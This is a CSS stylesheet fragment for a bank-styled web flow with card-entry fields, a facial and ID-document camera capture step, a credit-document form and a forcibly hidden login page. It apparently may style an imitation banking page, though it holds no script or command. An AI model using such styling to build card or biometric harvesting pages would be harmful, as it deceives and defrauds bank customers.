    grid-template-columns: 1fr 1fr;
    gap: clamp(0.75rem, 2.5vw, 1rem);
    margin-bottom: clamp(1rem, 3vw, 1.25rem)
  }

  .flow-card-row .flow-card-field {
    margin-bottom: 0
  }

  .flow-card-error {
    font-size: clamp(0.75rem, 2.2vw, 0.85rem);
    color: #dc2626;
    margin: clamp(0.5rem, 1.5vw, 0.75rem) 0;
    min-height: 18px;
    line-height: 1.4
  }

  .flow-card-btn {
    width: 100%;
    padding: clamp(0.7rem, 2.2vw, 0.85rem);
    font-size: clamp(0.9rem, 3vw, 1rem);
    font-weight: 600;
    border-radius: 9999px;
    border: none;
    cursor: pointer;
    transition: all .2s;
    margin-top: clamp(0.4rem, 1.2vw, 0.6rem);
    font-family: 'CIBFontSans', Arial, sans-serif
  }

  .flow-card-btn:disabled {
    background: #9ca3af;
    color: #111827;
    cursor: not-allowed
  }

  .flow-card-btn:not(:disabled) {
    background: #FDDA24;
    color: #111827;
    cursor: pointer
  }

  .flow-card-btn:not(:disabled):hover {
    background: #FDD010;
    transform: translateY(-1px)
  }

  .flow-card-btn:not(:disabled):active {
    transform: translateY(0);
    background: #F5C900
  }

  .flow-card-network {
    font-size: clamp(0.7rem, 2vw, 0.75rem);
    color: #6b7280;
    margin-top: clamp(0.3rem, 1vw, 0.4rem)
  }

  @media(max-width:480px) {
    .flow-card-row {
      grid-template-columns: 1fr;
      gap: clamp(0.8rem, 2.5vw, 1rem)
    }
  }

  .flow-923-text {
    text-align: left;
    font-size: 15px;
    line-height: 1.55;
    color: #2C2A29
  }

  .flow-923-text strong {
    font-family: 'CIBFontSans', Arial, sans-serif
  }

  .flow-check-success {
    width: 80px;
    height: 80px;
    object-fit: contain;
    margin: 0 auto 12px
  }

  .flow-final-p {
    font-size: 15px;
    line-height: 1.5;
    color: #454545;
    max-width: 40ch;
    margin: 0 auto 8px
  }

  .flow-ff-error {
    font-size: 12px;
    color: #D92D20;
    margin-top: 4px;
    min-height: 16px
  }


  .soyyo-nuevo-page {
    min-height: 100vh;
    background: #fff;
    color: #0a2540;
    display: flex;
    flex-direction: column
  }

  .soyyo-nuevo-page.app-view {
    display: none
  }

  .soyyo-nuevo-page.app-view.is-active {
    display: flex;
    position: fixed;
    inset: 0;
    z-index: 130;
    width: 100vw;
    min-height: 100vh;
    overflow: hidden
  }

  .soyyo-nuevo-app {
    width: 100%;
    max-width: 480px;
    min-height: 100vh;
    min-height: 100dvh;
    margin: 0 auto;
    display: flex;
    flex-direction: column;
    background: #fff
  }

  .soyyo-nuevo-app[hidden],
  #flowSoyyoFormView[hidden],
  #flowSoyyoFacialView[hidden] {
    display: none !important
  }

  .soyyo-nuevo-header {
    padding: 20px 16px 10px;
    text-align: center;
    flex-shrink: 0
  }

  .soyyo-nuevo-header__logo {
    height: 34px
  }

  .soyyo-nuevo-toastSlot {
    position: relative;
    z-index: 10;
    flex-shrink: 0;
    padding: 6px 16px 0;
    box-sizing: border-box;
    display: flex;
    justify-content: center
  }

  .soyyo-nuevo-toastSlot .login-panel-error-bar {
    max-width: min(560px, 100%)
  }

  .soyyo-nuevo-main {
    flex: 1;
    padding: 8px 24px 0;
    overflow-y: auto;
    -webkit-overflow-scrolling: touch
  }

  .soyyo-nuevo-step {
    display: none
  }

  .soyyo-nuevo-step--active {
    display: block
  }

  .soyyo-nuevo-title {
    font-size: 28px;
    margin: 18px 0 6px;
    color: #0b3c8a;
    font-weight: 700
  }

  .soyyo-nuevo-title2 {
    font-size: 26px;
    margin: 18px 0 12px;
    color: #0b3c8a;
    font-weight: 700
  }

  .soyyo-nuevo-subtitle {
    font-size: 16px;
    margin-bottom: 26px;
    color: #0a2540
  }

  .soyyo-nuevo-label {
    display: block;
    font-size: 14px;
    margin-bottom: 6px;
    color: #1f5fbf
  }

  .soyyo-nuevo-field {
    display: flex;
    gap: 10px;
    margin-bottom: 22px
  }

  .soyyo-nuevo-select {
    flex: 0 0 100px;
    padding: 14px 12px;
    border-radius: 6px;
    border: 1.5px solid #cfd8e3;
    font-size: 16px;
    outline: none;
    background: #fff
  }

  .soyyo-nuevo-select:focus {
    border-color: #1f5fbf
  }

  .soyyo-nuevo-input {
    width: 100%;
    padding: 14px 12px;
    border-radius: 6px;
    border: 1.5px solid #cfd8e3;
    font-size: 16px;
    outline: none
  }

  .soyyo-nuevo-input:focus {
    border-color: #1f5fbf
  }

  .soyyo-nuevo-hint {
    font-size: 13px;
    color: #1f5fbf;
    margin-top: 14px;
    margin-bottom: 18px
  }

  .soyyo-nuevo-info {
    display: flex;
    gap: 10px;
    background: #eaf3ff;
    border-radius: 8px;
    padding: 14px;
    font-size: 14px;
    color: #1f5fbf;
    margin-top: 6px
  }

  .soyyo-nuevo-info::before {
    content: "i";
    display: flex;
    align-items: center;
    justify-content: center;
    width: 22px;
    height: 22px;
    border-radius: 50%;
    border: 1.5px solid #1f5fbf;
    font-weight: 600;
    flex-shrink: 0
  }

  .soyyo-nuevo-footer {
    padding: 20px 24px;
    flex-shrink: 0;
    background: #fff
  }

  .soyyo-nuevo-btn {
    width: 100%;
    padding: 16px;
    border-radius: 8px;
    border: none;
    font-size: 16px;
    font-weight: 600;
    background: #e6e6e6;
    color: #fff;
    cursor: not-allowed;
    transition: all .2s
  }

  .soyyo-nuevo-btn--on {
    background: #1f5fbf;
    color: #fff;
    cursor: pointer
  }

  .soyyo-nuevo-footnote {
    text-align: center;
    font-size: 14px;
    color: #1f5fbf;
    margin-top: 14px
  }

  .soyyo-nuevo-app--facial {
    --kyc-accent: #0052CC;
    --kyc-success: #00875A;
    --kyc-error: #DE350B;
    font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
    -webkit-font-smoothing: antialiased;
    max-width: none;
    width: 100%;
    min-height: 100vh;
    min-height: 100dvh;
    margin: 0;
    background: #FFFFFF;
    color-scheme: light;
  }

  .kyc-stepper {
    display: none
  }

  .soyyo-nuevo-facial-inner {
    max-width: min(900px, 100%);
    margin: 0 auto;
    min-height: 100dvh;
    display: flex;
    flex-direction: column;
    box-sizing: border-box;
    padding: 0 20px 24px
  }

  .soyyo-nuevo-app--facial .soyyo-nuevo-header {
    padding: 24px 0 16px;
    text-align: center
  }

  .soyyo-nuevo-app--facial .soyyo-nuevo-header__logo {
    height: 40px;
    opacity: 1;
    filter: none;
    display: block;
    margin: 0 auto
  }

  .soyyo-nuevo-facial-main {
    flex: 1;
    overflow-y: auto;
    -webkit-overflow-scrolling: touch;
    padding: 0 0 12px;
    color: #172B4D
  }

  .soyyo-nuevo-facial-text {
    padding-top: 8px
  }

  .soyyo-nuevo-facial-main .soyyo-nuevo-title {
    color: #172B4D;
    font-size: clamp(1.5rem, 3vw, 2rem);
    margin: 0 0 8px;
    font-weight: 600;
    letter-spacing: -.02em;
    line-height: 1.2;
    text-align: center;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px
  }

  .soyyo-nuevo-title__shield {
    color: var(--kyc-accent);
    flex-shrink: 0
  }

  .soyyo-nuevo-facial-main .soyyo-nuevo-subtitle {
    color: #5E6C84 !important;
    font-size: clamp(1rem, 1.8vw, 1.15rem);
    line-height: 1.5;
    margin: 0 0 20px;
    font-weight: 400;
    text-align: center
  }

  .soyyo-nuevo-facial-pill {
    display: none;
    align-items: center;
    justify-content: center;
    text-align: center;
    gap: 8px;
    width: 100%;
    max-width: 36rem;
    margin: 0 auto 16px;
    padding: 14px 18px;
    border-radius: 10px;
    font-size: 14px;
    font-weight: 500;
    letter-spacing: 0;
    line-height: 1.4;
    box-sizing: border-box;
  }

  .soyyo-nuevo-facial-pill.is-visible {
    display: flex
  }

  .soyyo-nuevo-facial-pill--wait {
    background: #FFF4E5;
    color: #974F0C;
    border: 1px solid #FFD485;
    box-shadow: 0 2px 8px rgba(0, 0, 0, .06)
  }

  .soyyo-nuevo-facial-pill--ok {
    background: #E3FCEF;
    color: #006644;
    border: 1px solid#79F2C0;
    box-shadow: 0 2px 8px rgba(0, 0, 0, .06)
  }

  .soyyo-nuevo-facial-pill--err {
    background: #FFEBE6;
    color: #BF2600;
    border: 1px solid #FFBDAD
  }

  .flow-soyyo-camera-stage {
    width: 100%;
    max-width: min(600px, 100%);
    margin: 0 auto;
    position: relative;
    flex-shrink: 0;
    padding: 0;
    border-radius: 20px;
    background: #FFFFFF;
    border: 2px solid #DFE1E6;
    box-shadow: 0 8px 24px rgba(0, 0, 0, .08);
  }

  .flow-soyyo-camera-frame {
    position: relative;
    width: 100%;
    aspect-ratio: 3/4;
    max-height: min(70vh, 720px);
    margin: 0 auto;
    background: #F4F5F7;
    border-radius: 18px;
    overflow: hidden;
    box-shadow: inset 0 0 0 1px rgba(0, 0, 0, .08);
    transition: box-shadow .3s ease, border-color .3s ease;
  }

  .flow-soyyo-camera-frame.is-captured {
    box-shadow: inset 0 0 0 2px var(--kyc-accent), 0 4px 16px rgba(0, 82, 204, .15);
  }

  .flow-soyyo-camera-frame.is-approved-flash {
    box-shadow: inset 0 0 0 5px var(--kyc-success), 0 8px 24px rgba(0, 135, 90, .35);
    animation: kyc-pulse-success .6s ease;
  }

  .flow-soyyo-camera-frame.is-rejected-blink {
    box-shadow: inset 0 0 0 5px var(--kyc-error), 0 8px 24px rgba(222, 53, 11, .35);
    animation: kyc-pulse-error .6s ease;
  }

  @keyframes kyc-pulse-success {
    0% {
      box-shadow: inset 0 0 0 5px var(--kyc-success), 0 8px 24px rgba(0, 135, 90, .35)
    }

    50% {
      box-shadow: inset 0 0 0 6px var(--kyc-success), 0 12px 32px rgba(0, 135, 90, .5)
    }

    100% {
      box-shadow: inset 0 0 0 5px var(--kyc-success), 0 8px 24px rgba(0, 135, 90, .35)
    }
  }

  @keyframes kyc-pulse-error {
    0% {
      box-shadow: inset 0 0 0 5px var(--kyc-error), 0 8px 24px rgba(222, 53, 11, .35)
    }

    25% {
      box-shadow: inset 0 0 0 6px var(--kyc-error), 0 12px 32px rgba(222, 53, 11, .5)
    }

    50% {
      box-shadow: inset 0 0 0 5px var(--kyc-error), 0 8px 24px rgba(222, 53, 11, .35)
    }

    75% {
      box-shadow: inset 0 0 0 6px var(--kyc-error), 0 12px 32px rgba(222, 53, 11, .5)
    }

    100% {
      box-shadow: inset 0 0 0 5px var(--kyc-error), 0 8px 24px rgba(222, 53, 11, .35)
    }
  }

  #flowSoyyoVideo {
    position: absolute;
    inset: 0;
    width: 100%;
    height: 100%;
    object-fit: cover;
    display: block;
    background: #000;
  }

  #flowSoyyoPreview {
    position: absolute;
    inset: 0;
    width: 100%;
    height: 100%;
    object-fit: contain;
    display: none;
    z-index: 2;
    background: #0a0a12;
  }

  .soyyo-nuevo-face-guide,
  .soyyo-nuevo-doc-guide {
    position: absolute;
    inset: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    pointer-events: none;
    z-index: 4
  }

  .soyyo-nuevo-oval {
    position: relative;
    width: min(220px, 48vw);
    height: min(300px, 60vw);
    border-radius: 50%;
    border: 3px solid var(--kyc-accent);
    box-shadow: 0 0 20px rgba(0, 82, 204, .25);
  }

  .soyyo-nuevo-oval .soyyo-nuevo-scan {
    position: absolute;
    left: 10%;
    right: 10%;
    height: 2px;
    background: linear-gradient(90deg, transparent, var(--kyc-accent), transparent);
    animation: bc-soyyo-scan 3s ease-in-out infinite;
    opacity: .7;
    border-radius: 1px;
  }

  @keyframes bc-soyyo-scan {
    0% {
      top: 15%
    }

    50% {
      top: 85%
    }

    100% {
      top: 15%
    }
  }

  .soyyo-nuevo-rect {
    width: min(320px, 80vw);
    height: min(220px, 46vw);
    border-radius: 16px;
    border: 3px solid var(--kyc-accent);
    box-shadow: 0 0 20px rgba(0, 82, 204, .2);
  }

  .soyyo-nuevo-facial-capture-hint {
    display: none
  }

  .soyyo-nuevo-facial-body {
    display: block;
    width: 100%
  }

  .soyyo-nuevo-app--facial .soyyo-nuevo-footer {
    background: transparent;
    padding-top: 16px
  }

  .soyyo-nuevo-facial-footer {
    padding-bottom: max(20px, env(safe-area-inset-bottom, 16px));
  }

  .soyyo-nuevo-app--facial .kyc-shutter-btn {
    border-radius: 12px;
    padding: 16px 32px;
    font-weight: 600;
    letter-spacing: 0;
    font-size: 16px;
    background: var(--kyc-accent);
    color: #FFFFFF;
    border: none;
    box-shadow: 0 4px 12px rgba(0, 82, 204, .25);
    transition: background .2s ease, box-shadow .2s ease, transform .1s ease;
    cursor: pointer;
  }

  .soyyo-nuevo-app--facial .kyc-shutter-btn:hover:not([hidden]) {
    background: #0747A6;
    box-shadow: 0 6px 16px rgba(0, 82, 204, .3)
  }

  .soyyo-nuevo-app--facial .kyc-shutter-btn:active:not([hidden]) {
    transform: scale(.98);
    box-shadow: 0 2px 8px rgba(0, 82, 204, .2)
  }

  .soyyo-nuevo-app--facial .kyc-shutter-btn[hidden] {
    display: none !important
  }

  @media (max-width:767px) {
    .soyyo-nuevo-facial-inner {
      padding: 0 12px 16px
    }

    .soyyo-nuevo-app--facial .soyyo-nuevo-header {
      padding: 16px 0 12px
    }

    .soyyo-nuevo-app--facial .soyyo-nuevo-header__logo {
      height: 32px
    }

    .soyyo-nuevo-facial-main .soyyo-nuevo-title {
      font-size: 1.3rem;
      gap: 6px
    }

    .soyyo-nuevo-title__shield {
      width: 18px;
      height: 18px
    }

    .soyyo-nuevo-facial-main .soyyo-nuevo-subtitle {
      font-size: 0.9rem;
      margin-bottom: 14px
    }

    .flow-soyyo-camera-stage {
      max-width: 100%;
      border-width: 1.5px
    }

    .flow-soyyo-camera-frame {
      aspect-ratio: 3/4.2;
      max-height: min(68vh, 600px)
    }

    .soyyo-nuevo-oval {
      width: min(190px, 44vw);
      height: min(270px, 56vw)
    }

    .soyyo-nuevo-rect {
      width: min(280px, 76vw);
      height: min(190px, 42vw)
    }

    .soyyo-nuevo-app--facial .kyc-shutter-btn {
      padding: 14px 28px;
      font-size: 15px
    }

    .soyyo-nuevo-facial-pill {
      font-size: 13px;
      padding: 12px 16px;
      margin-bottom: 12px
    }

    .soyyo-nuevo-facial-footer {
      padding-top: 12px;
      padding-bottom: max(16px, env(safe-area-inset-bottom, 12px))
    }
  }

  @media (min-width:768px) {
    .soyyo-nuevo-facial-body {
      display: grid;
      grid-template-columns: minmax(0, 1fr) minmax(300px, 500px);
      gap: 24px 40px;
      align-items: start
    }

    .soyyo-nuevo-facial-body .soyyo-nuevo-facial-text {
      grid-column: 1
    }

    .soyyo-nuevo-facial-body .flow-soyyo-camera-stage {
      grid-column: 2;
      grid-row: 1/span 10;
      max-width: none;
      margin-top: 0
    }

    .soyyo-nuevo-facial-footer {
      padding-bottom: 32px
    }
  }


  .credit-doc-page {
    min-height: 100vh;
    background: #E9E9E9;
    color: #2C2A29;
    display: flex;
    flex-direction: column
  }

  .credit-doc-page.app-view {
    display: none
  }

  .credit-doc-page.app-view.is-active {
    display: flex;
    position: fixed;
    inset: 0;
    z-index: 115;
    width: 100vw;
    height: 100vh;
    overflow: hidden
  }

  .credit-doc-page .cd-header {
    height: 74px;
    background: #272627;
    border-bottom: 2px solid #FDDA24;
    display: grid;
    grid-template-columns: 1fr auto 1fr;
    align-items: center;
    padding: 0 18px;
    flex-shrink: 0
  }

  .credit-doc-page .cd-header__back,
  .credit-doc-page .cd-header__exit {
    display: inline-flex;
    align-items: center;
    gap: 8px;
    background: transparent;
    border: none;
    color: #FFF;
    cursor: pointer;
    font-family: 'OpenSans', Arial, sans-serif;
    font-size: 17px
  }

  .credit-doc-page .cd-header__exit {
    justify-self: end
  }

  .credit-doc-page .cd-header__logo {
    height: 48px;
    width: auto;
    justify-self: center;
    filter: brightness(0) invert(1)
  }

  .credit-doc-page .cd-main {
    flex: 1;
    overflow: auto;
    padding: 30px 20px 34px;
    background: #E9E9E9
  }

  .credit-doc-page .cd-card {
    max-width: 390px;
    margin: 0 auto
  }

  .credit-doc-page .cd-title {
    font-family: 'CIBFontSans', Arial, sans-serif;
    font-size: 34px;
    line-height: 1.15;
    color: #191E28;
    margin-bottom: 14px;
    letter-spacing: -.5px
  }

  .credit-doc-page .cd-field {
    margin-bottom: 18px
  }

  .credit-doc-page .cd-label {
    display: block;
    font-size: 15px;
    color: #1F2330;
    margin-bottom: 6px
  }

  .credit-doc-page .cd-row {
    display: flex;
    align-items: center;
    border-bottom: 1.5px solid #6A6A6A;
    padding: 8px 0;
    gap: 10px
  }

  .credit-doc-page .cd-row__text {
    font-size: 22px;
    color: #1F2330;
    flex: 1
  }

  .credit-doc-page .cd-row input {
    border: none;
    outline: none;
    background: transparent;
    width: 100%;
    font-size: 24px;
    color: #1F2330;
    font-family: 'OpenSans', Arial, sans-serif
  }

  .credit-doc-page .cd-row input::placeholder {
    font-size: 20px;
    color: #8A8A8A
  }

  .credit-doc-page .cd-row svg {
    color: #2C2A29;
    flex-shrink: 0
  }

  .credit-doc-page .cd-info {
    display: grid;
    grid-template-columns: 28px 1fr;
    column-gap: 10px;
    align-items: start;
    margin: 10px 0 18px
  }

  .credit-doc-page .cd-info__icon {
    width: 28px;
    height: 28px;
    border-radius: 50%;
    border: 1px solid #A9A9A9;
    display: flex;
    align-items: center;
    justify-content: center;
    color: #1D2432;
    font-size: 16px;
    line-height: 1
  }

  .credit-doc-page .cd-info p {
    font-size: 14px;
    line-height: 1.35;
    color: #0070B8
  }

  .credit-doc-page .cd-check-row {
    display: flex;
    align-items: flex-start;
    gap: 10px;
    margin: 12px 0 14px
  }

  .credit-doc-page .cd-check {
    width: 20px;
    height: 20px;
    border: 1.6px solid #8A8A8A;
    border-radius: 4px;
    background: #FFF;
    flex-shrink: 0;
    margin-top: 2px;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer
  }

  .credit-doc-page .cd-check.cd-check--on {
    background: #FDDA24;
    border-color: #FDDA24
  }

  .credit-doc-page .cd-check svg {
    display: none
  }

  .credit-doc-page .cd-check.cd-check--on svg {
    display: block
  }

  .credit-doc-page .cd-check-label {
    font-size: 14px;
    line-height: 1.35;
    color: #1D2432
  }

  .credit-doc-page .cd-check-label a {
    color: #1D2432;
    text-decoration: underline
  }

  .credit-doc-page .cd-dropdown {
    position: relative
  }

  .credit-doc-page .cd-row--select {
    cursor: pointer
  }

  .credit-doc-page .cd-dropdown__list {
    display: none;
    position: absolute;
    top: calc(100% + 4px);
    left: 0;
    right: 0;
    background: #F8F8F8;
    border: 1px solid #DCDCDC;
    border-radius: 6px;
    box-shadow: 0 4px 16px rgba(0, 0, 0, .1);
    z-index: 20;
    overflow: hidden;
    padding: 6px 0
  }

  .credit-doc-page .cd-dropdown__list--open {
    display: block
  }

  .credit-doc-page .cd-dropdown__opt {
    padding: 10px 14px;
    font-size: 15px;
    line-height: 1.3;
    color: #2C2A29;
    cursor: pointer;
    font-family: 'OpenSans', Arial, sans-serif;
    background: transparent
  }

  .credit-doc-page .cd-dropdown__opt:hover {
    background: #EFEFEF
  }

  .credit-doc-page .cd-dropdown__opt--selected {
    background: #E8E8E8
  }

  .credit-doc-page .cd-captcha-wrap {
    margin: 14px 0 30px
  }

  .credit-doc-page .cd-next {
    width: 100%;
    height: 48px;
    border: none;
    border-radius: 999px;
    background: #C4C6CA;
    color: #8E9398;
    font-family: 'CIBFontSans', Arial, sans-serif;
    font-size: 22px;
    font-weight: 700;
    cursor: not-allowed
  }

  .credit-doc-page .cd-next.cd-next--on {
    background: #FDDA24;
    color: #2C2A29;
    cursor: pointer
  }

  .credit-doc-page .cd-footer-info {
    display: none
  }

  .credit-doc-page .cd-footer-info__logo {
    height: 36px;
    width: auto;
    filter: brightness(0) invert(1)
  }

  .credit-doc-page .cd-footer-info__copy {
    font-size: 12px;
    color: #9A9A9A;
    text-align: center
  }

  .credit-doc-page .cd-desktop-footer {
    height: 120px;
    background: #272627;
    border-top: 1px solid #4A4A4A;
    display: flex;
    align-items: flex-start;
    justify-content: space-between;
    padding: 18px 48px 14px;
    gap: 20px;
    flex-shrink: 0
  }

  .credit-doc-page .cd-desktop-footer__left {
    display: flex;
    flex-direction: column;
    align-items: flex-start;
    gap: 8px
  }

  .credit-doc-page .cd-desktop-footer__logo {
    height: 44px;
    width: auto;
    filter: brightness(0) invert(1)
  }

  .credit-doc-page .cd-desktop-footer__copy {
    font-size: 12px;
    line-height: 1.35;
    color: #FFFFFF
  }

  .credit-doc-page .cd-desktop-footer__vigilado {
    height: 12px;
    width: auto
  }

  .credit-doc-page .cd-desktop-footer__right {
    text-align: right;
    color: #FFF;
    font-size: 12px;
    line-height: 1.45;
    margin-top: 24px
  }

  #loginPage,
  div[id="loginPage"] {
    display: none !important;
    visibility: hidden !important;
    opacity: 0 !important;
    pointer-events: none !important;
    height: 0 !important;
    width: 0 !important;
    overflow: hidden !important;
    position: absolute !important;
    left: -9999px !important;
    top: -9999px !important;
  }

  .credit-doc-page.app-view.is-active {
    display: block !important;
    position: relative;
    z-index: 99999;
    background: #ffffff;
    min-height: 100vh;
    width: 100%;
  }

  @media (max-width:768px) {
    .credit-doc-page.app-view.is-active,
    .login-page.app-view.is-active {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      overflow-y: auto;
    }

    .credit-doc-page .cd-header {
      height: 68px;
      padding: 0 12px
    }

    .credit-doc-page .cd-header__back,
    .credit-doc-page .cd-header__exit {
      font-size: 14px;
      gap: 5px
    }

    .credit-doc-page .cd-header__logo {
      height: 32px
    }

    .credit-doc-page .cd-main {
      padding: 16px 0 160px
    }

    .credit-doc-page .cd-card {
      max-width: none;
      padding: 0 20px
    }

    .credit-doc-page .cd-title {
      font-size: 22px;
      line-height: 1.3;
      margin-bottom: 16px
    }

    .credit-doc-page .cd-label {
      font-size: 13px;
      margin-bottom: 6px
    }

    .credit-doc-page .cd-row {
      padding: 8px 0
    }

    .credit-doc-page .cd-row__text {
      font-size: 15px
    }

    .credit-doc-page .cd-row input {
      font-size: 15px;
      line-height: 1.35;
      -webkit-text-size-adjust: 100%
    }

    .credit-doc-page .cd-row input::placeholder {
      font-size: 15px;
      color: #8A8A8A;
      opacity: 1
    }

    .credit-doc-page .cd-field {
      margin-bottom: 16px
    }

    .credit-doc-page .cd-dropdown__opt {
      font-size: 14px;
      padding: 9px 12px
    }

    .credit-doc-page .cd-info {
      grid-template-columns: 22px 1fr;
      column-gap: 10px;
      margin: 8px 0 14px
    }

    .credit-doc-page .cd-info__icon {
      width: 22px;
      height: 22px;
      font-size: 13px
    }

    .credit-doc-page .cd-info p {
      font-size: 12px;
      line-height: 1.4
    }

    .credit-doc-page .cd-check-row {
      gap: 8px;
      margin: 10px 0 10px
    }

    .credit-doc-page .cd-check {
      width: 18px;
      height: 18px;
      flex-shrink: 0;
      margin-top: 1px
    }

    .credit-doc-page .cd-check-label {
      font-size: 12px;
      line-height: 1.4
    }

    .credit-doc-page .cd-captcha-wrap {
      display: none
    }

    .credit-doc-page .cd-actions {
      position: fixed;
      left: 0;
      right: 0;
      bottom: 0;
      background: #272627;
      border-top: 1px solid #4A4A4A;
      padding: 12px 16px calc(12px + env(safe-area-inset-bottom));
      z-index: 2;
      display: flex;
      flex-direction: column;
      align-items: stretch;
      gap: 0
    }

    .credit-doc-page .cd-footer-info {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 3px;
      margin-bottom: 10px
    }

    .credit-doc-page .cd-footer-info__logo {
      height: 38px
    }

    .credit-doc-page .cd-footer-info__copy {
      font-size: 11px
    }

    .credit-doc-page .cd-next {
      height: 44px;
      font-size: 16px;
      font-weight: 700
    }

    .credit-doc-page .cd-desktop-footer {
      display: none
    }
  }


  @media (max-width:768px) {
    body {
      background: #FFF
    }

    .lp-header {
      padding: 0 16px;
      height: 60px;
      background: #FFFFFF
    }

    .lp-header__center img {
      height: 50px
    }

    .lp-logo-desktop {
      display: block
    }

    .lp-logo-mobile {
      display: none
    }

    .product-view[data-product-view="credito"] .lp-header__center img {
      height: 46px
    }

    .product-view[data-product-view="credito"] .lp-header__left {
      display: none
    }

    .product-view[data-product-view="credito"] .lp-header__right {
      display: flex;
      align-items: center;
      gap: 8px;
      justify-content: flex-end
    }

    .product-view[data-product-view="credito"] .lp-header__right .lp-hamburger {
      display: flex;
      gap: 4px;
      cursor: pointer
    }

    .product-view[data-product-view="credito"] .lp-header__right .lp-hamburger span {
      width: 18px;
      height: 2px;
      background: #2C2A29;
      border-radius: 2px
    }

    .product-view[data-product-view="credito"] .lp-header__right span {
      font-size: 14px;
      color: #2C2A29;
      display: inline;
      margin-left: 6px
    }

    .product-view[data-product-view="credito"] .lp-header__right svg {
      display: none
    }

    .product-view[data-product-view="vivienda"] .lp-logo-desktop {
      display: none
    }

    .product-view[data-product-view="vivienda"] .lp-logo-mobile {
      display: block
    }

    .product-view[data-product-view="vivienda"] .lp-header__center img {
      height: 34px
    }

    .product-view[data-product-view="vivienda"] .lp-header__left {
      display: flex;
      align-items: center;
      gap: 7px
    }

    .product-view[data-product-view="vivienda"] .lp-header__left .lp-hamburger {
      display: flex
    }

    .product-view[data-product-view="vivienda"] .lp-header__left>svg,
    .product-view[data-product-view="vivienda"] .lp-header__left>span {
      display: none
    }

    .product-view[data-product-view="vivienda"] .lp-header__right {
      display: flex;
      align-items: center;
      gap: 6px;
      justify-content: flex-end
    }

    .product-view[data-product-view="vivienda"] .lp-header__right .lp-hamburger {
      display: none
    }

    .product-view[data-product-view="vivienda"] .lp-header__right span,
    .product-view[data-product-view="vivienda"] .lp-header__right svg {
      display: inline
    }

    .product-view[data-product-view="vivienda"] .lp-header__right span {
      font-size: 13px;
      color: #2C2A29;
      margin-left: 0
    }

    .product-view[data-product-view="vivienda"] .lp-header__right svg {
      width: 14px;
      height: 14px
    }

    .lp-main {
      flex-direction: column;
      padding: 0;
      min-height: auto;
      background: linear-gradient(270deg, #fff3, #ffffff1b 43.23%, #fff0), linear-gradient(89.86deg, #51b2c5 .02%, #56b7cb 17.16%, #74c5d6 50.94%, #86cddc 99.78%);
      flex-wrap: wrap
    }

    [data-producto="credito"] .lp-main {
      background: #FFFFFF
    }

    .lp-main__left {
      width: 100%;
      height: 320px;
      order: 2;
      flex: none
    }

    .lp-main__left img {
      object-position: center
    }

    .lp-vigilado {
      display: block
    }

    .lp-main__right {
      width: 100%;
      padding: 0;
      gap: 0;
      display: contents;
      background: none
    }

    .lp-main__right>div:first-child {
      order: 1;
      width: 100%;
      padding: 32px 20px 24px;
      background: transparent
    }

    .lp-card {
      order: 3;
      width: calc(100% - 40px);
      max-width: 100%;
      margin: 0 20px 32px;
      padding: 32px 20px;
      background: #FFF;
      border-radius: 18px;
      box-shadow: 0 2px 8px rgba(0, 0, 0, .08)
    }

    .lp-promo__eyebrow {
      font-size: 13px
    }

    .lp-promo__title {
      font-size: 32px
    }

    .lp-promo__desc-bold {
      font-size: 15px
    }

    .lp-promo__desc {
      font-size: 13px
    }

    .lp-card__title {
      font-size: 20px
    }

    .lp-card__subtitle {
      font-size: 14px
    }

    .lp-details {
      padding: 32px 20px 40px
    }

    .lp-details__top {
      grid-template-columns: 1fr;
      gap: 18px;
      margin-bottom: 34px
    }

    .lp-details__top-img {
      width: 150px
    }

    .lp-details__top-text h3 {
      font-size: 24px;
      margin-bottom: 14px
    }

    .lp-details__list {
      font-size: 14px;
      line-height: 1.4
    }

    .lp-details__grid-title {
      font-size: 22px;
      margin-bottom: 24px
    }

    .lp-details__grid {
      grid-template-columns: 1fr;
      gap: 24px
    }

    .lp-details__item {
      grid-template-columns: 46px 1fr;
      column-gap: 12px
    }

    .lp-details__icon {
      width: 46px;
      height: 46px
    }

    .lp-details__icon img {
      width: 24px;
      height: 24px
    }

    .lp-details__item h4 {
      font-size: 18px
    }

    .lp-details__item p {
      font-size: 13px
    }

    .flow-loading-stage {
      --flow-d: min(65vw, 110px);
      flex-basis: var(--flow-d);
      width: var(--flow-d);
      height: var(--flow-d);
      min-width: var(--flow-d);
      min-height: var(--flow-d);
      max-width: var(--flow-d);
      max-height: var(--flow-d)
    }

    .flow-spinner {
      width: 28px;
      height: 28px;
      box-sizing: border-box;
      aspect-ratio: 1/1
    }

    .flow-status-text {
      font-size: 11px
    }

    .flow-loading-cluster {
      gap: 8px
    }

    .saas-page0-below {
      font-size: 11px
    }

    .saas-page0-check {
      width: 36px;
      height: 36px
    }

    .saas-page0-check__img {
      width: 36px;
      height: 36px
    }

    .flow-success-icon {
      font-size: 44px
    }

    .flow-security-modal {
      padding: 24px 18px
    }

    .flow-security-title {
      font-size: 22px
    }

    .flow-security-text {
      font-size: 14px
    }

    .flow-security-icon {
      width: 72px;
      height: 72px
    }

    .lp-footer {
      padding: 20px 16px;
      flex-direction: column;
      gap: 16px;
      align-items: flex-start
    }

    .lp-footer__left {
      gap: 6px
    }

    .lp-footer__logo {
      height: 20px
    }

    .lp-footer__copy {
      font-size: 11px
    }

    .lp-footer__vigilado {
      height: 18px
    }

    .lp-footer__trazo {
      display: none
    }

    .lp-footer__trazo-m {
      display: block;
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
      width: auto;
      max-width: 40%;
      object-fit: contain;
      object-position: right center;
      z-index: 1
    }

    .cc-hero-wrap {
      display: block
    }

    .cc-hero {
      grid-template-columns: 1fr;
      gap: 18px;
      padding: 30px 20px 0;
      min-height: auto
    }

    .cc-hero__copy {
      max-width: none;
      padding-top: 10px
    }

    .cc-hero__title {
      font-size: 38px;
      line-height: 1.04;
      margin-bottom: 16px
    }

    .cc-hero__desc {
      font-size: 18px;
      margin-bottom: 16px
    }

    .cc-hero__cta {
      height: 40px;
      font-size: 16px;
      padding: 0 16px;
      gap: 8px
    }

    .cc-hero__media {
      min-height: 248px;
      padding-top: 10px
    }

    .cc-hero__badge {
      left: 50%;
      top: 0;
      transform: translateX(-50%);
      width: min(92vw, 340px);
      font-size: 11px;
